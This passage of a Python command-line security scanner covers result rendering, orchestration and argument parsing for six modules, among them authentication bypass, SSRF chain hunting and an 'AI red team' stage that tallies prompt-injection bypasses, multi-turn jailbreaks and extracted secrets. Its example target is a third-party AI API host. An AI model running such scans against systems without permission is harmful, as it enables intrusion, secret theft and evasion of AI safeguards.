    sev_colors = {"critical": "bright_red", "high": "red", "medium": "yellow", "low": "green", "info": "dim"}
    for f in recon["findings"][:30]:
        sev = f["severity"]
        table.add_row(f"[{sev_colors.get(sev, 'white')}]{sev.upper()}[/{sev_colors.get(sev, 'white')}]",
                      f["category"], f["title"][:80])
    console.print(table)
    # Severity summary
    sc = recon["severity_counts"]
    console.print(f"  [bold]Severity breakdown:[/bold] "
                  f"[bright_red]{sc.get('critical',0)} critical[/], "
                  f"[red]{sc.get('high',0)} high[/], "
                  f"[yellow]{sc.get('medium',0)} medium[/], "
                  f"[green]{sc.get('low',0)} low[/], "
                  f"[dim]{sc.get('info',0)} info[/]")

def render_auth_table(auth: Dict[str, Any]):
    """Render AUTH BYPASS results."""
    bypasses = auth.get("bypass_findings", [])
    if bypasses:
        table = Table(title=f"AUTH BYPASS — {len(bypasses)} successful bypasses", border_style="bright_red",
                      header_style="bold bright_red")
        table.add_column("ID", style="dim", width=8)
        table.add_column("Technique", style="yellow")
        table.add_column("Endpoint", style="cyan")
        table.add_column("Status", style="green", width=8)
        for b in bypasses[:15]:
            table.add_row(b["id"], b["name"][:40], b["endpoint"], str(b["status"]))
        console.print(table)
    else:
        console.print(f"  [yellow]AUTH BYPASS — {auth.get('total_attempts',0)} attempts, 0 bypasses[/]")
    console.print(f"  [dim]Tested {auth.get('techniques_tested',0)} techniques × {auth.get('endpoints_per_technique',0)} endpoints[/]")

def render_chain_table(chain: Dict[str, Any]):
    """Render CHAIN HUNTER results."""
    ssrf = chain.get("findings", [])
    hits = [s for s in ssrf if s.get("ssrf_detected")]
    if hits:
        table = Table(title=f"CHAIN HUNTER — {len(hits)} SSRF detected", border_style="bright_magenta",
                      header_style="bold bright_magenta")
        table.add_column("ID", style="dim", width=8)
        table.add_column("Vector", style="magenta")
        table.add_column("Endpoint", style="cyan")
        for h in hits[:10]:
            table.add_row(h["id"], h["vector"][:50], h["endpoint"])
        console.print(table)
    else:
        console.print(f"  [magenta]CHAIN HUNTER — {chain.get('chains_tested',0)} chains tested, 0 SSRF confirmed[/]")
    redirects = chain.get("redirect_chains", [])
    if redirects:
        console.print(f"  [dim]Redirect chains: {len(redirects)} found, {chain.get('open_redirects',0)} open redirects[/]")

def render_bot_table(bot: Dict[str, Any]):
    """Render BOT HUNTER results."""
    hits = bot.get("bot_findings", [])
    if hits:
        table = Table(title=f"BOT HUNTER — {len(hits)} bot/C2 indicators", border_style="bright_red",
                      header_style="bold bright_red")
        table.add_column("Signature", style="red")
        table.add_column("Detail", style="cyan")
        for h in hits[:10]:
            detail = h.get("path", f"port {h.get('port','?')}")
            table.add_row(h.get("signature", "?"), detail)
        console.print(table)
    else:
        console.print(f"  [red]BOT HUNTER — {bot.get('signatures_tested',0)} signatures tested, 0 hits[/]")

def render_gorgon_summary(gorgon: Dict[str, Any]):
    """Render GORGON ULTRA summary."""
    if "error" in gorgon:
        console.print(f"  [bright_red]GORGON ULTRA — error: {gorgon['error']}[/]")
        return
    score = gorgon.get("threatScore", 0)
    fear = gorgon.get("fearIndex", 0)
    level = gorgon.get("threatLevel", "UNKNOWN")
    fear_level = gorgon.get("fearLevel", "UNKNOWN")
    console.print(f"  [bright_red]GORGON ULTRA — Threat: {score}/100 [{level}], Fear: {fear}/100 [{fear_level}][/]")
    summary = gorgon.get("summary", {})
    if summary:
        console.print(f"  [dim]Endpoints: {summary.get('endpointsDiscovered',0)} | "
                      f"Injection bypasses: {summary.get('injectionBypassesSuccessful',0)} | "
                      f"Multi-turn bypasses: {summary.get('multiTurnBypassesSuccessful',0)} | "
                      f"CVEs: {summary.get('cvesMatched',0)} | "
                      f"Secrets: {summary.get('secretsExtracted',0)}[/]")

def render_oblivion_summary(oblivion: Dict[str, Any]):
    """Render OBLIVION summary."""
    if "error" in oblivion:
        console.print(f"  [bright_magenta]OBLIVION — error: {oblivion['error']}[/]")
        return
    verdict = oblivion.get("verdict", {})
    score = verdict.get("threatScore", 0)
    dread = verdict.get("dreadIndex", {})
    dread_score = dread.get("score", 0)
    dread_level = dread.get("level", "UNKNOWN")
    quote = verdict.get("wisdomQuote", "")
    console.print(f"  [bright_magenta]OBLIVION — Threat: {score}/100, Dread: {dread_score}/100 [{dread_level}][/]")
    if quote:
        console.print(f"  [italic bright_magenta]\"{quote}\"[/]")

def render_unified_verdict(verdict: Dict[str, Any]):
    """Render the final unified verdict."""
    score = verdict["unified_score"]
    level = verdict["verdict_level"]
    color = {"OMNIPOTENT": "bright_magenta", "DEVASTATING": "bright_red", "SUBSTANTIAL": "red",
             "NOTABLE": "yellow", "MUNDANE": "dim"}.get(level, "white")
    # Score bar
    bar_width = 40
    filled = int(score / 100 * bar_width)
    bar = "█" * filled + "░" * (bar_width - filled)

    text = Group(
        Text(f"\n  UNIFIED VERDICT", style=f"bold {color}"),
        Text(f"  {bar} {score}/100", style=f"bold {color}"),
        Text(f"  Level: {level}", style=f"bold {color}"),
        Text(f"  {verdict['verdict_text']}", style="white"),
        Text(""),
        Text("  Module Scores:", style="bold cyan"),
    )
    for k, v in verdict["module_scores"].items():
        mod_color = {"recon": "cyan", "auth": "yellow", "chain": "magenta",
                     "bot": "red", "gorgon": "bright_red", "oblivion": "bright_magenta"}.get(k, "white")
        bar_w = 20
        filled = int(v / 100 * bar_w)
        bar = "█" * filled + "░" * (bar_w - filled)
        line = Text()
        line.append(f"    {k.upper():12s} ", style=mod_color)
        line.append(f"{bar} ", style="dim")
        line.append(f"{v:3d}/100", style=mod_color)
        text.renderables.append(line)

    panel = Panel(text, border_style=color, title="[bold]FINAL VERDICT[/bold]", title_align="left", padding=(1, 2))
    console.print(panel)

# ══════════════════════════════════════════════════════════════════════════════
# ORCHESTRATION
# ══════════════════════════════════════════════════════════════════════════════

def run_unified_scan(host: str, modules: List[str] = None) -> Dict[str, Any]:
    """Run the unified scan across all selected modules."""
    if modules is None:
        modules = [m["id"] for m in MODULES]

    encounter_id = generate_encounter_id(host)
    start = time.time()

    # Header
    console.print()
    render_banner()
    console.print(f"\n  [bold bright_cyan]Target:[/] [bold white]{host}[/]")
    console.print(f"  [bold bright_cyan]Encounter ID:[/] [bold white]{encounter_id}[/]")
    console.print(f"  [bold bright_cyan]Modules Selected:[/] [bold white]{', '.join(modules).upper()}[/]")
    console.print(f"  [bold bright_cyan]Signature:[/] [dim]{RECONPRO_SIGNATURE}[/]\n")

    console.print(Rule("[bold bright_cyan]The Six Blades[/]", style="bright_cyan"))
    render_module_list()
    console.print(Rule(style="bright_cyan"))

    report: Dict[str, Any] = {
        "engine": RECONPRO_NAME,
        "tagline": RECONPRO_TAGLINE,
        "version": RECONPRO_VERSION,
        "signature": RECONPRO_SIGNATURE,
        "encounter_id": encounter_id,
        "target": host,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "modules_selected": modules,
    }

    # Run each module
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        # RECON
        if "recon" in modules:
            task = progress.add_task("[cyan]RECON — 13-category surface reconnaissance...", total=None)
            try:
                recon = module_recon(host)
                report["recon"] = recon
                progress.update(task, completed=True, description="[green]✓ RECON complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ RECON failed: {e}")
            progress.refresh()

        # AUTH BYPASS
        if "auth" in modules:
            task = progress.add_task("[yellow]AUTH BYPASS — 15 techniques × 5 endpoints...", total=None)
            try:
                auth = module_auth_bypass(host)
                report["auth_bypass"] = auth
                progress.update(task, completed=True, description="[green]✓ AUTH BYPASS complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ AUTH BYPASS failed: {e}")

        # CHAIN HUNTER
        if "chain" in modules:
            task = progress.add_task("[magenta]CHAIN HUNTER — SSRF + redirect chains...", total=None)
            try:
                chain = module_chain_hunter(host)
                report["chain_hunter"] = chain
                progress.update(task, completed=True, description="[green]✓ CHAIN HUNTER complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ CHAIN HUNTER failed: {e}")

        # BOT HUNTER
        if "bot" in modules:
            task = progress.add_task("[red]BOT HUNTER — C2 / bot infrastructure...", total=None)
            try:
                bot = module_bot_hunter(host)
                report["bot_hunter"] = bot
                progress.update(task, completed=True, description="[green]✓ BOT HUNTER complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ BOT HUNTER failed: {e}")

        # GORGON ULTRA
        if "gorgon" in modules:
            task = progress.add_task("[bright_red]GORGON ULTRA — 15-stage AI red team...", total=None)
            try:
                gorgon = module_gorgon(host)
                report["gorgon"] = gorgon
                progress.update(task, completed=True, description="[green]✓ GORGON ULTRA complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ GORGON failed: {e}")

        # OBLIVION
        if "oblivion" in modules:
            task = progress.add_task("[bright_magenta]OBLIVION — 23-stage analytical dissolution...", total=None)
            try:
                oblivion = module_oblivion(host)
                report["oblivion"] = oblivion
                progress.update(task, completed=True, description="[green]✓ OBLIVION complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ OBLIVION failed: {e}")

    elapsed = round(time.time() - start, 2)
    report["duration_seconds"] = elapsed

    # Unified verdict
    try:
        verdict = compute_unified_verdict(report)
        report["unified_verdict"] = verdict
    except Exception as e:
        verdict = {"unified_score": 0, "module_scores": {}, "verdict_text": f"verdict error: {e}", "verdict_level": "ERROR"}
        report["unified_verdict"] = verdict

    # Save report FIRST so it's never lost to a renderer bug
    try:
        os.makedirs("/home/z/my-project/download", exist_ok=True)
        safe_host = host.replace(".", "_").replace("/", "_")
        early_out = f"/home/z/my-project/download/reconpro_unified_{safe_host}.json"
        with open(early_out, "w") as f:
            json.dump(report, f, indent=2, default=str)
        report["_auto_saved_to"] = early_out
    except Exception:
        pass

    # Render results (each renderer is wrapped so one failure doesn't kill the rest)
    console.print()
    console.print(Rule("[bold bright_cyan]Module Results[/]", style="bright_cyan"))

    def _safe(label, fn, data):
        try:
            if data and "error" not in data:
                console.print()
                fn(data)
            elif data:
                console.print(f"\n  [red]{label} — error: {data.get('error','?')}[/]")
        except Exception as e:
            console.print(f"\n  [red]{label} — render error: {e}[/]")

    _safe("RECON", render_recon_table, report.get("recon"))
    _safe("AUTH BYPASS", render_auth_table, report.get("auth_bypass"))
    _safe("CHAIN HUNTER", render_chain_table, report.get("chain_hunter"))
    _safe("BOT HUNTER", render_bot_table, report.get("bot_hunter"))
    _safe("GORGON ULTRA", render_gorgon_summary, report.get("gorgon"))
    _safe("OBLIVION", render_oblivion_summary, report.get("oblivion"))

    # Final verdict
    console.print()
    console.print(Rule("[bold bright_magenta]Final Verdict[/]", style="bright_magenta"))
    try:
        render_unified_verdict(verdict)
    except Exception as e:
        console.print(f"  [red]verdict render error: {e}[/]")

    console.print(f"\n  [dim]Total elapsed: {elapsed}s | Encounter: {encounter_id}[/]")
    console.print(f"  [dim]Signature: {RECONPRO_SIGNATURE}[/]\n")

    return report

# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(description="ReconPro UNIFIED CLI — Six Blades, One Target, One Verdict")
    ap.add_argument("target", nargs="?", default="", help="Target host (e.g. generativelanguage.googleapis.com)")
    ap.add_argument("--modules", "-m", help="Comma-separated module IDs (recon,auth,chain,bot,gorgon,oblivion)",
                    default="recon,auth,chain,bot,gorgon,oblivion")
    ap.add_argument("--all", action="store_true", help="Run all 6 modules (default)")
    ap.add_argument("--output", "-o", help="Output JSON file", default=None)
    ap.add_argument("--list", action="store_true", help="List modules and exit")
    args = ap.parse_args()

    if args.list:
        render_banner()
        render_module_list()
        return

    modules = [m.strip() for m in args.modules.split(",") if m.strip()]
    if args.all or not modules:
        modules = [m["id"] for m in MODULES]

    # Validate module IDs
    valid_ids = {m["id"] for m in MODULES}
    invalid = [m for m in modules if m not in valid_ids]
    if invalid:
        console.print(f"[red]Invalid module(s): {', '.join(invalid)}. Valid: {', '.join(valid_ids)}[/]")
        sys.exit(1)

    report = run_unified_scan(args.target, modules)

    # Save report
    if args.output:
        out_path = args.output
    else:
        os.makedirs("/home/z/my-project/download", exist_ok=True)
        safe = args.target.replace(".", "_").replace("/", "_")
        out_path = f"/home/z/my-project/download/reconpro_unified_{safe}.json"

    with open(out_path, "w") as f:
        json.dump(report, f, indent=2, default=str)
    console.print(f"  [green]✓ Report saved:[/] [bold]{out_path}[/]")

if __name__ == "__main__":
    main()
